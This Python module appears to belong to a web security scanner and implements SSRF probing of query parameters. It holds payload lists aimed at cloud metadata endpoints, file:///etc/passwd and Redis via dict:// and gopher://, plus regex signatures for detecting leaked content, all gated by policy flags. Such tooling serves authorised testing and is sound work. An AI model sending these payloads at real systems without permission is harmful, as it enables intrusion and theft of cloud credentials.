from __future__ import annotations

import base64
import hashlib
import re
from dataclasses import dataclass
from typing import List, Tuple
from urllib.parse import urlparse, urlencode, parse_qsl, urlunparse

from .base import Mutator
from ..contracts.enums import VulnerabilityClass, WebMethod, ParamLocation, DeltaSeverity
from ..contracts.errors import PolicyViolation
from ..contracts.models import ParamSpec, WebMission
from ..context import WebContext
from ..transport import MutatingTransport, MutationResult


# ---------------------------------------------------------------------------
# SSRF canary payloads
# ---------------------------------------------------------------------------

# These payloads test whether the server-side code fetches user-supplied URLs.
# We use two strategies:
# 1. OOB canary: inject a unique URL pointing at an external listener
# 2. In-band indicators: inject known-bad URLs and detect error signatures

# Internal network targets that should never be accessible from internet-facing apps
_INTERNAL_TARGETS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://[::1]",
    "http://0.0.0.0",
    "http://169.254.169.254/latest/meta-data/",  # AWS IMDS
    "http://metadata.google.internal/",           # GCP metadata
    "http://169.254.169.254/metadata/instance",   # Azure IMDS
]

# Protocol smuggling payloads
_PROTOCOL_PAYLOADS = [
    "file:///etc/passwd",
    "file:///c:/windows/win.ini",
    "dict://127.0.0.1:6379/INFO",     # Redis
    "gopher://127.0.0.1:6379/_INFO",  # Redis via gopher
]

# Response signatures indicating the server attempted the fetch
_SSRF_INDICATORS: List[Tuple[re.Pattern, str]] = [
    # AWS IMDS responses
    (re.compile(r"ami-id|instance-id|local-hostname|iam/security-credentials", re.I), "aws_imds"),
    # GCP metadata
    (re.compile(r"computeMetadata|project-id|instance/zone", re.I), "gcp_metadata"),
    # Azure metadata
    (re.compile(r"azEnvironment|subscriptionId|vmId", re.I), "azure_metadata"),
    # File read indicators
    (re.compile(r"root:x:0:0:|daemon:x:1:1:", re.I), "etc_passwd"),
    (re.compile(r"\[fonts\]|\[extensions\]", re.I), "win_ini"),
    # Internal service responses
    (re.compile(r"redis_version|redis_mode", re.I), "redis_info"),
    # Generic internal page markers
    (re.compile(r"<title>.*?dashboard.*?</title>|phpinfo\(\)", re.I), "internal_page"),
]

# Error signatures suggesting the server tried to resolve/connect
_FETCH_ERROR_INDICATORS: List[Tuple[re.Pattern, str]] = [
    (re.compile(r"Connection refused|ECONNREFUSED", re.I), "conn_refused"),
    (re.compile(r"getaddrinfo.*?failed|Name or service not known|nodename nor servname", re.I), "dns_failure"),
    (re.compile(r"Could not resolve host|Couldn't resolve host", re.I), "dns_resolve"),
    (re.compile(r"SSL certificate problem|certificate verify failed", re.I), "ssl_error"),
    (re.compile(r"java\.net\.ConnectException|java\.net\.UnknownHostException", re.I), "java_net"),
    (re.compile(r"urllib\.error\.URLError|requests\.exceptions", re.I), "python_net"),
]


def _decode_body(b64: str | None) -> str:
    if not b64:
        return ""
    try:
        return base64.b64decode(b64).decode("utf-8", errors="ignore")
    except Exception:
        return ""


def _check_patterns(
    body: str, patterns: List[Tuple[re.Pattern, str]]
) -> List[str]:
    """Return names of matched patterns."""
    return [name for pat, name in patterns if pat.search(body)]


@dataclass
class SsrfMutator:
    vuln_class: VulnerabilityClass = VulnerabilityClass.SSRF

    def run(
        self,
        mission: WebMission,
        ctx: WebContext,
        transport: MutatingTransport,
        url: str,
        method: WebMethod,
        budget_index: int,
    ) -> List[MutationResult]:
        if not mission.oob_allowed:
            raise PolicyViolation("SSRF mutator requires oob_allowed=true")

        results: List[MutationResult] = []

        parsed = urlparse(url)
        params = parse_qsl(parsed.query, keep_blank_values=True)

        if not params or method != WebMethod.GET:
            return results

        # Establish baseline
        handle = transport.establish_baseline(mission, ctx, method, url)
        baseline_body = _decode_body(handle.exchange.response_body_b64)
        baseline_indicators = _check_patterns(baseline_body, _SSRF_INDICATORS)
        baseline_fetch_errors = _check_patterns(baseline_body, _FETCH_ERROR_INDICATORS)

        mutation_count = 0

        for param_idx, (param_name, original_value) in enumerate(params):
            # Heuristic: only test params that look like they could be URLs or paths
            if not self._looks_like_url_param(param_name, original_value):
                continue

            # --- Phase 1: Internal network probes ---
            for target in _INTERNAL_TARGETS:
                if budget_index + mutation_count >= mission.exploit_ceiling:
                    return results

                mutated_url = self._inject_param(
                    parsed, params, param_idx, target
                )
                param_spec = ParamSpec(
                    name=param_name,
                    location=ParamLocation.QUERY,
                    example_value=original_value,
                    type_guess="string",
                    reflection_hint=False,
                )

                mutation_res = transport.mutate(
                    mission=mission,
                    ctx=ctx,
                    handle=handle,
                    vuln_class=self.vuln_class,
                    mutation_label=f"ssrf_internal_{param_name}_{mutation_count}",
                    budget_index=budget_index + mutation_count,
                    mutated_url=mutated_url,
                    mutated_method=method,
                    param_spec=param_spec,
                )
                mutation_count += 1

                resp_body = _decode_body(
                    mutation_res.exchange.response_body_b64
                )

                # Check for direct SSRF indicators (content from internal services)
                new_indicators = [
                    h for h in _check_patterns(resp_body, _SSRF_INDICATORS)
                    if h not in baseline_indicators
                ]
                if new_indicators:
                    mutation_res.delta.severity = DeltaSeverity.HIGH
                    mutation_res.delta.notes.append(
                        f"SSRF confirmed: internal content leaked via param '{param_name}' "
                        f"({', '.join(new_indicators)})"
                    )
                    results.append(mutation_res)
                    break  # One confirmed per param

                # Check for fetch error indicators (server tried to connect)
                new_fetch_errors = [
                    h for h in _check_patterns(resp_body, _FETCH_ERROR_INDICATORS)
                    if h not in baseline_fetch_errors
                ]
                if new_fetch_errors:
                    # Lower confidence: server attempted the fetch but didn't succeed
                    mutation_res.delta.severity = DeltaSeverity.MEDIUM
                    mutation_res.delta.notes.append(
                        f"SSRF probable: server-side fetch attempt via param '{param_name}' "
                        f"({', '.join(new_fetch_errors)})"
                    )
                    results.append(mutation_res)
                    break

                # Check for significant status code change (e.g., 200 -> 500)
                if (
                    mutation_res.delta.status_delta is not None
                    and abs(mutation_res.delta.status_delta) >= 200
                ):
                    mutation_res.delta.severity = DeltaSeverity.LOW
                    mutation_res.delta.notes.append(
                        f"SSRF indicator: status change {handle.signature.status_code} -> "
                        f"{mutation_res.exchange.response_status} on param '{param_name}'"
                    )
                    results.append(mutation_res)
                    break

            # --- Phase 2: Protocol smuggling (only if destructive_methods_allowed) ---
            if mission.destructive_methods_allowed:
                for payload in _PROTOCOL_PAYLOADS:
                    if budget_index + mutation_count >= mission.exploit_ceiling:
                        return results

                    mutated_url = self._inject_param(
                        parsed, params, param_idx, payload
                    )
                    param_spec = ParamSpec(
                        name=param_name,
                        location=ParamLocation.QUERY,
                        example_value=original_value,
                        type_guess="string",
                        reflection_hint=False,
                    )

                    mutation_res = transport.mutate(
                        mission=mission,
                        ctx=ctx,
                        handle=handle,
                        vuln_class=self.vuln_class,
                        mutation_label=f"ssrf_protocol_{param_name}_{mutation_count}",
                        budget_index=budget_index + mutation_count,
                        mutated_url=mutated_url,
                        mutated_method=method,
                        param_spec=param_spec,
                    )
                    mutation_count += 1

                    resp_body = _decode_body(
                        mutation_res.exchange.response_body_b64
                    )
                    new_indicators = [
                        h for h in _check_patterns(resp_body, _SSRF_INDICATORS)
                        if h not in baseline_indicators
                    ]
                    if new_indicators:
                        mutation_res.delta.severity = DeltaSeverity.HIGH
                        mutation_res.delta.notes.append(
                            f"SSRF protocol smuggling: {payload.split(':')[0]}:// "
                            f"via param '{param_name}' ({', '.join(new_indicators)})"
                        )
                        results.append(mutation_res)
                        break

        return results

    @staticmethod
    def _looks_like_url_param(name: str, value: str) -> bool:
        """Heuristic: does this param look like it could accept a URL or path?"""
        # Name-based heuristics
        url_param_names = {
            "url", "uri", "link", "href", "src", "source", "dest",
            "destination", "redirect", "return", "next", "target",
            "path", "file", "page", "load", "fetch", "callback",
            "proxy", "forward", "location", "go", "continue",
            "image", "img", "resource", "endpoint",
        }
        name_lower = name.lower().strip()
        if name_lower in url_param_names:
            return True
        # Substring match for common patterns
        for hint in ("url", "uri", "path", "file", "redirect", "callback"):
            if hint in name_lower:
                return True
        # Value-based heuristics
        if value.startswith(("http://", "https://", "//", "/", "ftp://")):
            return True
        return False

    @staticmethod
    def _inject_param(
        parsed,
        params: list,
        param_idx: int,
        payload: str,
    ) -> str:
        """Build URL with SSRF payload injected into the specified parameter."""
        mutated_params = list(params)
        mutated_params[param_idx] = (mutated_params[param_idx][0], payload)
        mutated_query = urlencode(mutated_params)
        return urlunparse(
            (parsed.scheme, parsed.netloc, parsed.path,
             parsed.params, mutated_query, parsed.fragment)
        )
